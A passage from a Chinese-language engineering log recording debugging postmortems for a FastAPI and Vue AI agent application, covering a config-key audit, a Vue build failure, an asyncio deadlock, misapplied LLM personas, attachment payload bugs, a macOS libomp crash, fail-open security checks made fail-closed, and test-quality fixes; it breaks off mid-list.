导入 FastAPI app 枚举全部路由（`for r in app.routes: (methods, r.path)`），得到 177 条真实端点，**不要靠 grep**（静态挂载/条件挂载会漏）。

### 22.2 层 2：前端调用路径 → 后端路由匹配（抓死路由）
脚本提取全部 `.vue/.js` 中的字符串路径（`'/api/xxx'`、`'/xxx'`、模板字符串），将具体段替换为 `{p}` 与后端模式匹配。**结果：25 个前端路径全部命中，0 死路由**——没有 404 按钮。

### 22.3 层 3：消费方审计（抓"存了没人读"——摆设的核心）
提取前端所有 `XxxCfg('KEY')` / `updateConfig('KEY')` / CK 映射表 key，对每个 key 统计**排除 tests/docs/frontend/cli_tui 后**的后端引用数：
- 不在 `_MODIFIABLE_FIELDS` 白名单 → PUT /config 会 403（点了没反应）；
- 引用数 ≤1（仅 settings.py 定义）→ 疑似摆设。
- **注意陷阱：** 前端 CK 映射表用**小写** key（`allow_geolocation`/`shortcut_keys`/`launch_at_startup`），正则提取时容易漏掉——必须同时扫大写与小写。

### 22.4 层 4：运行时实测（真后端 + 真前端）
1. 后端用 `subprocess.Popen(start_new_session=True)` 启动（普通 nohup 会被 basher 会话清理杀掉）；
2. 前端 vite 另起端口（5173 可能被别的应用占用——**本次 5173 被一个 React 营销页占用，前端真身是 Vue**）；
3. 只读端点批量 curl 验证（28 个全 200）；
4. 写操作链路用**临时会话**实测并清理（outreach-config/tasks/title/人设/工具权限/模型参数/记忆事件 全 ✓）；
5. 浏览器 evaluate_script 端到端（改配置 → 派发 KeyboardEvent → 检查 `document.activeElement`）。

### 22.5 审计结论
- **52 个前端配置 key：51 个真实消费，1 个摆设**——`shortcut_keys`（启动快捷键）；
- 摆设原因：Settings.vue 可编辑并保存到后端，但**前端 App.vue 的快捷键逻辑是硬编码 Cmd/Ctrl+K**，后端也仅有 settings.py 定义处 1 处引用，用户改的值零消费；
- 用户实际已配置 `⌥ + X` 却从未生效——实锤摆设。

### 22.6 修复（让快捷键真实生效）
`App.vue`：
1. 引入 `useConfigStore()`，keydown 时读取 `config.shortcut_keys || config.SHORTCUT_KEYS`；
2. 新增 `parseShortcut()` 解析 `⌥ + X` / `Cmd+K` / `Ctrl+Shift+P`（支持 ⌘/⌥/⇧/⌃/Cmd/Alt/Option/Ctrl 等写法）；
3. 新增 `shortcutMatches()` 精确匹配修饰键组合；
4. 配置快捷键命中 → `_focusChat()`（跳转对话页 + 聚焦输入框）；内置 Cmd/Ctrl+K 作为兜底保留；
5. Settings.vue 描述文案同步更新（"按下后聚焦对话输入框（实时生效）"）。

**验证：** 解析逻辑 node 单测 8 项全过；浏览器端到端：设 `Ctrl+Alt+X` → 后端读回 ✓ → 派发键盘事件 → 焦点落在输入框 TEXTAREA ✓ → 恢复 `⌥ + X` ✓。

**经验：**
1. **"能编辑、能保存"≠"有效果"**——判断摆设要查"谁消费这个值"，前后端都要查（本次前端硬编码键盘、后端无引用，两头都不消费）；
2. 审计配置类按钮必须**同时扫大/小写 key**，前端 CK 表常混用；
3. 运行时实测优先用**后端真实响应 + 临时数据清理**，浏览器全量点击易受环境干扰，evaluate_script 是可靠的端到端手段；
4. 启动测试后端要脱离会话（`start_new_session=True`），否则进程被清理；开发端口可能被其他应用占用，先 `lsof -i` 确认。


## 23. "点详情没反应"的两种根因：DOM 位置 + 构建失败（前端）

**现象：** 仪表盘 API 请求日志点「详情」按钮，页面纹丝不动，用户以为按钮失效。

**根因 1（主因）：详情面板渲染在视口外**
- `API_PAGE = 50`——日志表格每页 50 行，`dash-detail` 详情面板在表格**之后**渲染；
- 点击按钮只设置 `apiDetail.value`，**没有任何滚动逻辑**——面板出现在页面底部视口之外，用户看不到任何变化；
- 浏览器实测（evaluate_script）：点击后 `dash-detail` 确实出现，但 `rect.top=3736 > viewport 2029`，且 `scrollY=0`——功能在但不可见。

**根因 2（隐蔽炸弹）：Settings.vue 重复 class 属性导致 vite build 失败**
- `<div class="setting-ctl" class="ctl-flex">`——同一元素两个 class 属性，Vue 编译器直接报 `Duplicate attribute`；
- 该错误已提交进 HEAD（共 4 处），**任何 `vite build` 都会失败**→ dist 无法更新，用户 8765 永远加载旧版；
- 排查链：build 失败 → 定位 Settings.vue:428 → 全项目扫描 `class="..." class=` 找出全部 4 处。

**修复：**
1. `Dashboard.vue`：`openApiDetail` 里 `nextTick` + `scrollIntoView({behavior:'smooth', block:'start'})` 滚动到面板（注意滚动容器是 `.page-body`，不是 window）；
2. `Settings.vue`：4 处 `class="setting-ctl" class="ctl-flex"` → `class="setting-ctl ctl-flex"`；
3. `api/main.py`：GET/DELETE 请求无 body，改为记录 `?query` 到 `request_body`（否则 GET 详情恒为「无记录」）。

**验证：** 浏览器实测点击后 `rect.top=1712 < viewport 2029` → 面板可见 ✓；GET 日志详情显示 `?limit=3` ✓；相关测试 33 项全过。

**经验：**
1. **"点按钮没反应"先查 DOM 位置/可见性**，再怀疑事件绑定——面板渲染到视口外是最常见的假象；
2. **`vite build` 失败 = 用户永远在用旧版前端**——任何部署前先跑一次 build，CI/提交流程应包含构建校验；
3. 排查重复属性等模板错误，用 grep 全项目扫描（`class="[^"]*" class=`）一次抓全；
4. SPA 产物：index.html 必须 no-cache（server.py 已做），带 hash 资源可 immutable；但**已打开的页面不会自动刷新**，升级后需告知用户刷新/重启窗口。


## 24. send_json_from_thread 事件循环线程内自锁 → 对话报错（后端）

**报错（ERROR，错误消息为空）：**
```
2026-08-10 17:34:32 - stream_api - ERROR - [ConnectionManager] send_json_from_thread 失败:
```
冒号后**空消息**是关键特征——这是 `concurrent.futures.TimeoutError`（`future.result(timeout)` 超时抛出，`str()` 为空）。

**现象：** 对话中（尤其 deepseek 推理模型返回 `reasoning_content` 时）后端日志刷该错误，思考事件推送被卡 5 秒。

**根因：** `modules/thinking/api_stream.py` `ConnectionManager.send_json_from_thread()` 用
`asyncio.run_coroutine_threadsafe(_send(), self._loop)` + `future.result(timeout=5.0)` 同步阻塞发送，
设计目标是供**非事件循环线程**（daemon 线程）安全调用。但 `_push_reasoning`
（`modules/thinking/core/model_runner.py:1204`，模型推理时推送 thinking 事件）在**事件循环线程内**调用它：

- `run_coroutine_threadsafe` 把 `_send` 调度到事件循环；
- `future.result(timeout=5)` **阻塞事件循环自身线程** → `_send` 永远没机会执行；
- 5 秒后 `TimeoutError`，空错误消息，每次推送卡 5 秒。

即"自己调度自己 + 自己阻塞自己"的自锁（`run_coroutine_threadsafe` 官方说明只能在非循环线程调用）。

**为什么测试没抓到：**
- `tests/unit/test_api_stream_core.py` 只测了三条路径：无事件循环、无连接、**独立工作线程**调用
  （`test_send_json_from_thread_success` 恰好走的是能正常工作的跨线程路径）；
- **事件循环线程内调用**这条路径没有测试——必须真实跑对话、模型带 `reasoning_content` 才会触发，
  且是运行期时序问题（要真把循环卡 5s 才报错），单测/集成测试都构造不出。

**修复：** `send_json_from_thread` 入口检测是否已运行在事件循环线程上（`asyncio.get_running_loop() is self._loop`）：
- 是 → `asyncio.create_task(_fire_and_forget())` 异步调度发送，**不阻塞**，立即返回 True；
- 否（后台线程）→ 保持原 `run_coroutine_threadsafe + future.result(timeout)` 语义。

**验证：** 新增回归测试 `test_send_json_from_thread_on_loop_thread_not_blocked`
（`tests/unit/test_api_stream_core.py`）——在 async 上下文（事件循环线程）内调用，断言立即返回 True
且消息送达；相关 13 个用例全过，全量 1460 通过。

**经验：**
1. **凡是"跨线程安全"的同步入口，都要同时考虑"在事件循环线程内被调用"的分支**——`run_coroutine_threadsafe`/`loop.call_soon_threadsafe` 从循环线程调用自身就是死锁/超时；
2. **空错误消息往往来自 `TimeoutError`/`CancelledError`**（`str()` 为空）——日志里"失败: "后面什么都没有时，优先怀疑同步等待超时；
3. **测试要覆盖"生产里真实调用上下文"**——只测另一条线程的成功路径，会漏掉事件循环线程内的自锁场景。


## 25. 工具型单次 LLM 调用被统一套上 agent 人设（后端）

**现象：** 记忆收纳/对话摘要/安全审查/良知反思等**纯工具型**单次 LLM 调用，模型实际收到的 system prompt 是无关的 agent 人设（总指挥/代码专家），与任务要求的身份（记忆分析专家/摘要助手/安全专家）冲突，且白白消耗 token（人格+工具表+安全规则+能力表+价值观全带上）。

**根因：** 三个模型客户端的 `generate()` 快捷方法**内部硬编码** system prompt：
- `LargeModelClient.generate` → `PromptRequest(tier="large", role="orchestrator")`
- `SmallModelClient.generate` → `tier="expert", role="code_writer"`
- `MediumModelClient.generate` → `tier="supervisor", role="code_supervisor"`

而调用方（`EventReducer._call_llm`、`context_slicer._summarize_chunk`、`tool_security_gate._check_llm_review`、`conscience.think/analyze_feedback`）只传了自足的任务 prompt，把 system prompt 留给客户端默认 → 每个工具任务都套上无关人设。

**主对话流是正确的（非统一）：** `ModelRunner._build_system_prompt_for_mode()` → `PromptComposer.build_system(PromptRequest(tier=self.tier, role=self.identity.role))`，走 `chat()`/`chat_stream()` 时 system 消息按角色区分（总指挥/代码主管/各专家），`roles.yaml` 人格各不相同，支持设置页自定义人设——主模型提示词构造正常，问题只在通用 `generate()` 快捷路径。

**修复：**
1. 三个客户端 `generate()` 新增 `system_prompt: str = None` 参数——**非空时覆盖**自动人设，默认行为不变（向后兼容）；
   > **后续变更（§27.8 前）：** `generate()` 的 `system_prompt` 已改为 **keyword-only 必填**——缺失直接
   > `TypeError`，不再注入任何默认 agent 人设（详见 docs 后续 §27.8 config/providers 接线）。
2. 各工具调用方传入专用精简 system prompt（各自"只做 X、不执行工具、只输出指定格式"）：
   - `event_reducer` → `MEMORY_REDUCE_SYSTEM_PROMPT`（记忆收纳）
   - `context_slicer` → 摘要助手专用（对话摘要）
   - `tool_security_gate` → 安全审查专用
   - `conscience` → `CONSCIENCE_SYSTEM_PROMPT`（良知/因果反馈）
3. `model_runner._generate` 传统回退路径：原来把 `system_prompt + prompt` 拼成一个 user 字符串传给 `generate()`，会再被自动注入一份 system（**双份 system prompt**）——改为 `system_prompt=system_prompt` 分开传，消除重复。

**为什么测试没抓到：**
- 主对话流本就走 `chat()`（自带 role prompt），`generate()` 的硬编码人设只在工具型调用路径生效，测试大多断言"被调用/返回内容"，**不检查传入的 system prompt 内容**；
- 新增参数后部分测试 mock 签名不兼容（`generate()` 不接收 `system_prompt`），被 `assert` 抓到并同步更新了 mock 签名（`test_toolgate.py`、`test_conscience.py`、`test_model_runner_core.py`）。

**验证：** 新增 `test_reduce_uses_dedicated_system_prompt`（`tests/unit/test_event_reducer.py`）断言记忆收纳调用带专用 system prompt；全量 unit 1095 通过。

**经验：**
1. **"模型客户端通用方法"的人设默认值，只应服务主对话流**——凡把通用 `generate()` 当"单次 LLM 调用"用的工具任务，都必须显式传自己的 system prompt，否则会继承无关 agent 人设（身份冲突 + 浪费 token）；
2. **给通用方法加新参数时，先 grep 所有 mock/调用方**——测试里的替身类 mock 常因签名不兼容直接抛 `unexpected keyword argument`；
3. **断言"输出内容质量"比断言"被调用"更能抓 prompt 类问题**——§20 同款经验。


## 26. 聊天附件"发不出去"：三个契约断裂连环 + 测试基建缺失（前端/后端）

**现象：** 前端聊天框上传图片后，AI 看不到图片内容；甚至只带图片不带文字时消息根本发不出去。

**根因（三个独立 bug 连环，任一环断裂图片就失效）：**

1. **前端只发裸 dataURL 字符串（载荷形状错）** `frontend/src/components/ChatInput.vue`
   `handleSend` 发送 `attachments.value.map(a => a.data)`——把 `{type,name,data}` 对象拆成**裸 base64 字符串数组**。后端 `parse_attachments` 用 `if not isinstance(att, dict): continue` 跳过所有非字典项 → 图片被**静默丢弃**，用户看到"发出去了"实际为空。
2. **附件 type 存的是内部类别而非 MIME** `ChatInput.vue` `handleFiles`
   附件对象 `type` 写死为 `isImage ? 'image' : 'file'`（内部类别）。后端用 `atype.startswith("image/")` 判断是否走视觉——`'image'` 不匹配 `"image/"` → 图片被当普通文件，只标注文件名、**不走视觉分析**。
3. **视觉 API URL 双重 `/chat/completions` → 404** `infra/data_process/core/image_analyzer.py`
   `_analyze_openai` 把 `VISION_API_URL`（含 `/chat/completions`）直接当 `base_url` 传给 openai SDK，SDK 再拼一次路径 → 请求打到 `.../chat/completions/chat/completions` → 404 → 图片解析失败降级为文本。`config/providers/openai.py:76-78` 有去重处理，`ImageAnalyzer` 没有。

**为什么测试没抓到：**
- 后端单测 `test_attachment_handler.py` 只**直接调用 `parse_attachments`**，且传的是结构正确的字典——它验证"后端函数在正确输入下工作"，但从不验证"前端实际发送的载荷形状"；
- 前端**完全没有测试基建**（package.json 无 test 脚本、无 vitest/jest、零 spec 文件），唯一校验 `npm run build` 只查语法/引用，查不出载荷形状错误；
- 后端 WS input 无 schema 校验——`chat_gateway.py`/`api_stream.py` 都是 `json.loads` + `.get()` 直接取字段，前端发错形状**静默跳过不报错**。

**修复：**
1. `ChatInput.vue`：发送载荷改为完整 `{type, name, data}` 字典数组；**允许仅图片（无文字）发送**（原 `if (!text) return` 拦截）。
2. `ChatInput.vue`：附件 `type` 存真实 MIME（`file.type`），预览判断改 `startsWith('image/')`。
3. `image_analyzer.py`：`_analyze_openai` 与 `_detect_ui_openai` 对 base_url 归一化（去尾部 `/chat/completions`），与 `config/providers/openai.py` 保持一致。
4. **后端契约校验**：`attachment_handler.py` 新增 `ChatAttachment` 模型 + `validate_attachments()`，`chat_gateway.py`/`api_stream.py` 的 WS input 解析前先校验，非法形状返回明确错误事件，不再静默吞掉。
5. **前端测试基建**：引入 vitest + @vue/test-utils + jsdom，`npm test`；`ChatInput.spec.js` 5 用例固定发送载荷形状（含两条历史 bug 回归）。
6. **后端契约测试**：`tests/unit/test_attachment_contract.py` 11 用例覆盖裸字符串数组、缺 data、坏元素整体拒绝、校验通过即可解析。

**验证：** 后端 52 项相关测试通过（attachment + contract + api_stream + ws_client）、chat_light 系列 32 项通过；前端 5 项测试通过、`vite build` 通过。

**同类排查：** 附件发送方仅 Vue 前端（旧版 `frontend/js` 已删、无独立 `backend/` 包）；生产 WS 附件入口仅 `chat_gateway.py` + `api_stream.py` 两处，均已加校验；URL 双重路径模式抓到并修复了 `_detect_ui_openai`（当时为 DeepSeek 地址未触发，属潜伏同类 bug）。

**经验：**
1. **"后端函数在正确输入下工作"≠"整条链路通"**——前后端契约（载荷形状/字段名/枚举值）必须有一方做显式校验，否则发错形状只会静默丢数据；
2. **测试要覆盖"真实载荷形状"，不只测"函数被正确调用"**——前端无测试基建本身就是隐患，任何"前端发什么、后端期望什么"的边界都应写单测固定契约；
3. **传给 OpenAI SDK 的 base_url 必须归一化**——凡是配置里可能带 `/chat/completions` 的地址，传 SDK 前先去重，否则双重路径 404 且错误极难定位；
4. **内部类别名（image/file）≠ 协议类型（image/png）**——用 `startsWith`/枚举匹配的字段，数据源必须存"协议认可的值"而非"界面展示类别"。


## 27. macOS 双 libomp 段错误/abort + 测试与生产环境审查（后端/环境）

**现象：** 组合运行 `test_chat_light_* + test_conscience` 时进程崩溃：
- 首次 `OMP: Error #15: Initializing libomp.dylib, but found libomp.dylib already initialized` → `Fatal Python error: Aborted`（exit 134）
- 设 `KMP_DUPLICATE_LIB_OK=TRUE` 后变为 `Segmentation fault`（exit 139），崩溃点随机（torch import / BERT forward）
- 单独跑 `test_conscience`（12 项）或 `test_chat_light_*`（34 项）都通过，只有组合才崩——flaky、时序相关

**根因（两层，实证排查）：**
1. **双 OpenMP 运行时（真根因）**：`otool -L` 证实 `faiss/_swigfaiss.abi3.so` 与 `torch/lib/libtorch_cpu.dylib` 各依赖**自己的** `libomp.dylib`（`@loader_path/.dylibs/libomp.dylib` vs `torch/lib/libomp.dylib`）。同一进程两套 OpenMP，第二个初始化时 abort（OMP: Error #15）；用 `KMP_DUPLICATE_LIB_OK` 容忍后，两套 OpenMP 的线程池在运行时冲突 → 随机段错误。
2. **曾被误判的并发竞态**：崩溃栈里出现 `event_store.py:268 _worker` 后台线程，一度怀疑是 worker 与主线程并发加载/推理 torch 导致。为此加了 `EmbeddingEngine._load_lock`/`_infer_lock`、测试关 worker——**均无效**。用最小脚本 `faiss→torch` / `torch→faiss` 复现均正常，说明双 libomp 本身不必然崩，崩溃是"两套 OpenMP + 既有线程状态"的时序问题。**教训：段错误排查先做最小复现+二分组合，别急着改业务代码。**

**根因修复：** `scripts/fix_macos_libomp.py` 用 `install_name_tool -change` 把 faiss 二进制的 `@loader_path/.dylibs/libomp.dylib` 改为 torch 的 libomp **绝对路径**，dyld 按规范化路径去重 → 进程只剩**单一 OpenMP 运行时**；`codesign --force --sign -` 重新签名。
- `KMP_DUPLICATE_LIB_OK` 从"修复"降级为"兜底"（未跑脚本的环境避免 abort，但不保证稳定）
- 升级 faiss/torch 后需重跑脚本（`--check` 检测、`--restore` 恢复）

**验证：** 组合 46 项全过；**不设 KMP_DUPLICATE_LIB_OK** 时 `faiss + torch + BERT 推理`正常（证明已单一 OpenMP）；连续 3 次组合测试稳定通过。

**经验：**
1. **"多实例动态库"（OMP/OpenSSL/其他）不能靠 env 容忍当修复**——`KMP_DUPLICATE_LIB_OK` 官方标注 "unsafe, unsupported"：只消除初始化 abort，运行期仍随机段错误。根因是合并到单一实例（install_name_tool 指向同一绝对路径）。
2. **环境级修复必须写成可重复脚本**（升级依赖后失效）+ 兜底 env + 文档，否则换机/升级即复发。
3. **排查原生崩溃：先最小复现 + 二分测试组合**，用 faulthandler 抓线程栈，区分"必然崩溃"与"时序 flaky"。

### 27.1 测试与真实生产环境不一致（审查清单）

| 项 | 现状 | 处置 |
|---|---|---|
| `test_conscience.py` clean_state | 曾回退到生产 `data/events_faiss_<USER>.index`（fixture 只传 db_path） | **已修**：faiss/id_map 一并指临时目录 + 重置 `EventRetrieval._instance` |
| `test_trigger_think.py` `_Diff` | 假对象带生产不存在的 `description` 字段（§20 警告模式）；旧测试只断言触发数量 | **已修**：`_Diff` 改真实字段（category+payload），内容断言由 §20 新增测试覆盖 |
| `test_chat_light_thinker.py` | mem_store 用 hashlib 假 embed（生产 torch BERT 384 维）——确定性测试合理，真实 embed 由 `test_memory_search.py` 覆盖 | 合理，保留 |
| `EMBEDDING_BACKGROUND_WORKER` | 测试关、生产开 | 合理差异（测试不需要后台向量化），conftest 注释说明 |
| `generate()` 各客户端 | 测试 mock 签名与生产不兼容时抛 TypeError（§25） | 已统一 + mock 同步 |

### 27.2 表层修复审查（重点提醒）

- **`KMP_DUPLICATE_LIB_OK=TRUE`（settings.py / conftest.py）**——最典型的表层修复，已升级为根因合并脚本。
- **`except Exception: pass` 全库 193 处**——多数合理（ImportError 探测/后台清理/降级），但这是"错误被吞、真问题被掩盖"的高发区。改动前先确认吞错是否可接受、是否该记日志。
- **`test_write_final_result_supervisor/expert`** 原只 `assert_called_once()`，已补强断言写入内容（§26 同类经验）。

### 27.3 真实核心路径零测试覆盖（§19 教训再验证）

排查发现 `infra/data_process/core/image_analyzer.py` 的真实视觉方法
（`_detect_available_model` / `_analyze_openai` / `_analyze_mlx_vlm` / `_analyze_qwen_vl`）
**零测试覆盖**——`test_screen_monitor_and_vision.py` / `test_ui_interactor.py` 全部用
monkeypatch 的 analyzer 替身，真实视觉代码（含 §26 修的 base_url 归一化、VISION_BACKEND
检测、deepseek/openai 消息格式）没有任何回归保护。这正是 §19"mock 掩盖真实实现"的教训。

**修复：** 新增 `tests/unit/test_image_analyzer.py`（8 项）：
- `_detect_available_model`：api 无 key → unavailable / api 有 key → openai / 未知后端容错回退
- `_analyze_openai` base_url 归一化（`/chat/completions` 去重，§26 回归）+ 普通 URL 保留
- deepseek base64 内联 vs openai image_url 两种消息格式
- `analyze()` 后端不可用时降级返回

**经验：** 排查测试缺口时，专门找"测试里全部用 mock/patch 替身、真实实现零引用"的模块——
这类模块的真实路径任何回归都无保护，是§19/§20 事故的高发区。

### 27.4 生产代码 fail-open 修复 + 测试 mock 掩盖清单（全量审查）

**生产代码 fail-open（安全高危，已修）：** `modules/security_system/tool_security_gate.py` 两处
安全校验异常被 `except Exception: pass` 静默吞掉 → **fail-open**（权限系统/安全拦截出错时工具被放行绕过安全门控）：
- 角色类别权限检查异常（原 :254 静默 pass）→ 改为 fail-closed：log + 审计 + 拒绝
- 写操作安全拦截检查异常（原 :281 静默放行）→ 改为 fail-closed：log + 审计 + 拒绝

**修复验证：** 新增 `TestFailClosedOnCheckExceptions`（2 项）——mock 权限检查抛异常、安全拦截检查抛异常，
均断言 `check()` 返回拒绝。安全校验必须 fail-closed 是铁律，任何"校验出错继续放行"都是高危表层修复。

**测试 mock 掩盖真实核心路径清单（explore 全量扫描）：**

| 生产符号 | 被 mock 掩盖 | 真实覆盖 |
|---|---|---|
| `trigger_think._run/_has_active_connections/_think` | test_trigger_think.py 全 patch | **无**（仅 external） |
| `ToolSecurityGate._check_user_review/resolve_review` | test_toolgate:166-280、test_control_mode:57-80 共 7 处 | **无** |
| `ModelRunnerManager` 整类 | 仅 get_runner_manager 被替换 | **无（零引用）** |
| `MultiModelOrchestrator._execute_multi_model_thinking` | 全依赖 mock | **无** |
| `ContinuousThinker` 类 | model_runner_core:269,299,330 替换为假类 | 部分（__init__ 等） |
| `ModelRunner` 14 方法 | 无引用 | **无** |
| `ImageAnalyzer` 本地 VLM+UI 16 方法 | 4 个测试文件替换为假对象 | 部分（§27.3 补 API 分支） |
| `management/api.py` 41 端点 | — | 零覆盖 |

**经验：** 排查"测试与生产不一致"时，两类最有价值：
1. **安全/权限代码的静默吞错 → fail-open**（比功能 bug 严重得多）——凡安全校验的 `except: pass` 都必须 fail-closed；
2. **测试全 mock 真实实现导致真实核心路径零覆盖**——trigger_think 真实链路、审批 future 回填、
   runner 编排、orchestrator 全链路等仍是回归盲区，优先级高的应逐步补真实测试。

### 27.5 继续修复：真实审批路径测试 + 权限控制器 fail-open（续）

接 §27.4 的 mock 掩盖清单，本轮补上真实实现测试并再修一处 fail-open：

**1. `ToolSecurityGate._check_user_review` 真实实现测试（4 项，test_toolgate.py）**
原审批核心路径（future 等待 + `resolve_review` 回填 + 防重叠 + `Suspension` 全局挂起/恢复）7 处全被 patch。
新增真实测试：批准流（resolve True → 返回"用户批准"）、拒绝流、防重叠（同工具二次请求返回等待、
不新增审批）、未知 request_id 不报错；每个测试断言 `Suspension` 挂起被 finally 恢复。

**2. `trigger_think._think` 真实 prompt 链路测试（2 项，test_trigger_think.py）**
原 `_run/_think` 全被 `_fake_run` 掩盖。新增测试走真实 `_think`：mock 边界（`generate_and_push`/`call_outreach_llm`），
断言传给 LLM 的 prompt **真实包含差异描述**（防 §20 desc 空转回归）、消息类型/事件正确、空 desc 不崩溃。

**3. `tool_permission_controller._get_caller_permissions` fail-open → fail-closed（高危）**
`check_execution_permission` 对 `permissions is None` 放行；而 `_get_caller_permissions` 外层
`except Exception: pass → return None` 把权限查询异常静默变成 None → **权限系统故障时所有工具绕过类别校验**。
修复：外层异常改为 log + 返回 `ModelPermissions(allowed_tool_categories=[])`（空权限 → 拒绝全部），
"正常未找到"仍返回 None（保持控制工具默认允许语义）。内层 YAML 解析异常改 log 留痕。
新增 2 项测试：model_factory 抛异常 → `check_execution_permission("git_add")` 拒绝；控制工具保持默认允许。

**验证：** test_toolgate 74 项、权限相关（control_mode/tool_visibility/tool_permission/probe_permission）
128+17 项全过；image_analyzer/trigger_think/conscience 等 156 项通过。

### 27.6 假测试排查（续）：名不副实 + 无断言 + flaky 超时

按"假测试"模式全量扫描测试替身与断言质量：

**已修复的名不副实/无断言测试：**
1. `test_build_system_prompt_contains_role`（core_continuous_thinker）——名字要求断言 role 但只
   `try/except pass` 吞错；且调用 `_build_prompt("用户输入", "初始问题")` 把 round_num 传成字符串。
   改为 `test_build_prompt_contains_question`：真实构建并断言 prompt 含初始问题。
   **顺带发现**：`_build_prompt` 输出只有【当前任务】段，role 人设由 system prompt 负责（与文档
   line 601 注释一致）——测试名原本就误导。
2. `test_rebuild_faiss_dim_same/mismatch`（embedding）——无断言，补：同维度不重建（os.remove 未调用）、
   异维度触发重建。
3. `test_emit_streaming_content`（model_runner_core）——收集了广播消息却不断言，补：消息真实携带
   `entry_type="streaming_delta"`/增量内容/tier/round。

**核查为合理（非假测试）的替身**：FakeEvent/FakeChain（覆盖被消费字段）、FakeThinker/FakeBlackboard/
FakeRepo（backend 精简版内存替身）、FakeClient/FakeMCP（真实接口）、FakeObs（显式对齐真实模型字段）、
FakeGtts（外部库替身）、_FakeValueSystem（接口与真实一致，仅注释"未实现"过时）、_FakeRepo（消费最小接口）。

**flaky 根因修复：** `test_image_analyzer.py` 偶发超时——`_detect_available_model` 真实执行
`from mlx_vlm import ...` → 触发 transformers 重库 import，组合跑时超过 pytest 全局 `--timeout=10`。
加模块级 `pytestmark = pytest.mark.timeout(60)`（与 conscience 同款）。连续 5 次组合跑稳定通过。

**经验：** 排查"假测试"三条线索——① 名字暗示行为期望但函数体无断言/只吞错；② 断言只查
"被调用/不抛异常"不查内容；③ 会 import 重库的测试受全局 10s timeout 影响出现顺序相关 flaky，
需按需放宽 timeout。

### 27.7 pass 排查 + 非确定性测试审查

**测试中 pass 语句全量核查（37 处）**：35 处合理——mock 占位（`async def accept: pass`/`__aexit__`/`close`）、
异常类定义（`class X(Exception): pass`）、teardown 清理、ImportError 依赖探测。**2 处是假测试，已修：**

1. **`test_context_slicer.py::test_slice_for_large_basic`（假测试，掩盖真实 bug）**——
   `try: slice_for_large("用户输入", {}, {}, {}, {}) ... except (AttributeError, TypeError): pass`。
   去掉吞错后暴露：`slice_for_large` 签名早已从多参数改为**单 `CognitiveBlackboard` 参数**，
   测试一直传 5 个参数触发 TypeError 被静默吞掉、测试空跑假通过。已修为真实 `CognitiveBlackboard`
   实例 + 断言输出含 goal。**教训：`except (TypeError, AttributeError): pass` 是假测试的高发形态，
   它会掩盖"生产接口改了、测试没跟上"这类真实回归。**
2. `test_screen_capture_daemon.py` 一处 `with patch.object(...): pass`（patch 生效期内无操作无断言）
   无效代码，已删除。

**非确定性测试审查（每次输出可能不同）**：随机数/`set` 遍历为 0；时间相关 55 处均为相对比较
（冷却/时间窗口），无日期字面量绑定；时序 sleep 测试断言用边界容忍（如 `count >= 1`）而非精确值；
数组顺序断言 5 处——3 处底层 list 保序、1 处测试自身 `sorted()`、1 处单元素；真实 LLM/API 全部
mock（无真实调用）；uuid 仅用于生成唯一测试数据不绑定值。**结论：无不合理的非确定性断言。**

### 27.8 config/providers 接线（方案 B）：格式层合并 infra/model

**背景：** `config/providers` 是早期设计的格式适配层（ProviderBase + openai/anthropic/dashscope +
registry），但生产从未接线（0% 覆盖）——`infra/model` 三个客户端各自内建了重复的格式分支
（`_api_format` + anthropic/openai/dashscope 三分支），且两套逻辑已分叉：
`config/providers/openai.py` 的 `chat_url()` 有 `/v1`/`/chat/completions` 归一化，而客户端直接
`session.post(api_url)` 不做归一化（配 `https://api.openai.com/v1` 会 404，当前靠配置 URL 已含完整端点规避）。

**合并方式（不粗暴替换、不缩减功能）：**
1. 三个客户端 `__init__` 通过 `get_provider(model, key, url, api_format)` 接线 Provider，
   统一使用 `provider.build_headers()` / `build_request()` / `chat_url()`（尊重显式 `_api_format`，
   未显式时按 URL 推断）。
2. 增强 Provider 以覆盖客户端能力：`OpenAIProvider.parse_response` 增加 `reasoning_content`（thinking 模式）；
   `ProviderBase.build_request` 接口增加 `top_p`（small 客户端特有参数，openai 生效，anthropic/dashscope 忽略）。
3. **保留客户端特有逻辑**（不缩减）：large 的 DashScope legacy 文本工具调用解析、流式累积解析
   （`_parse_openai/_anthropic/_dashscope_stream`）、HTTP/重试/日志/SSL、`reasoning_content` 回退、
   usage 语义；small/medium 的 `api_messages` 序列化（tool_calls/tool_call_id/reasoning_content 回传）。
4. 统一 URL：所有请求改走 `self._chat_url = provider.chat_url()`，消除 `/v1` 404 隐患。

**验证：** 新增 `tests/unit/test_providers.py`（17 项：URL 推断/显式格式、三格式 build_request、
chat_url 归一化、parse_response 含 reasoning_content、stream 单行解析）；模型相关 216 项 +
全量 unit 1141 项通过（`test_post_format` payload 断言证明接线后请求格式与原来完全一致）。

**教训：** 两套做同一件事的适配层并存必然分叉（格式检测默认值、URL 归一化不一致）。合并方向是
"格式构造/解析归 Provider、HTTP 骨架与客户端特有逻辑留在客户端"，且必须用 payload 格式测试
（test_post_format）锁定行为不变。

### 27.9 端到端全绿 + 覆盖补测（utils/agent 工具/流式/记忆链路）

**端到端：** `pytest tests -m "not external and not slow"` → **1569 passed, 0 failed**。
修复一个全量组合 flaky：`test_causal_graph_comprehensive` 的语义查询触发真实 BERT 加载超
pytest-timeout 10s（与 conscience 同款），加模块级 `timeout(60)`。

**新增测试（按未覆盖优先级）：**
- `tests/unit/test_utils.py`（19 项）——time_utils/json_utils/async_utils/exceptions 从 **0% → 全覆盖**
  （时间转换、JSON 序列化含 datetime、异步并发控制/超时、异常层级与 safe_call/safe_acall）。
- `tests/unit/test_agent_tools.py`（15 项）——calculator（纯逻辑）、todo（文件持久化 + 会话隔离）、
  audit_tools（日志 + 审计报告）、tools_search（关键词/类别过滤）。
- `tests/unit/test_large_model_stream.py`（7 项）——大模型客户端三套流式解析（openai 含
  reasoning_content/tool_calls 累积、anthropic content blocks、dashscope 累积文本增量）。
- `tests/unit/test_memory_chain.py`（19 项）——depth_recall 纯逻辑（intent 分类/触发判定/
  _time_decay/_build_conclusion）+ causal_tree（CausalChain.summary/EvidenceTree.format）。
- 此前 `tests/unit/test_providers.py`（17 项）——config/providers 格式层（§27.8 接线后）。

**覆盖提升：** config/providers 0%→覆盖、utils 0%→覆盖、agent 工具 8-18%→显著提升、
large_model_client 13%→含流式、depth_recall/causal_tree 11-12%→纯逻辑覆盖。

### 27.10 继续补测：management/api 端点 + 安全工具（git/exec_command）

**新增测试（全量 1569 → 1602 全绿）：**
- `tests/unit/test_management_api_ext.py`（14 项）——management/api 零覆盖端点：health_check（healthy/degraded）、
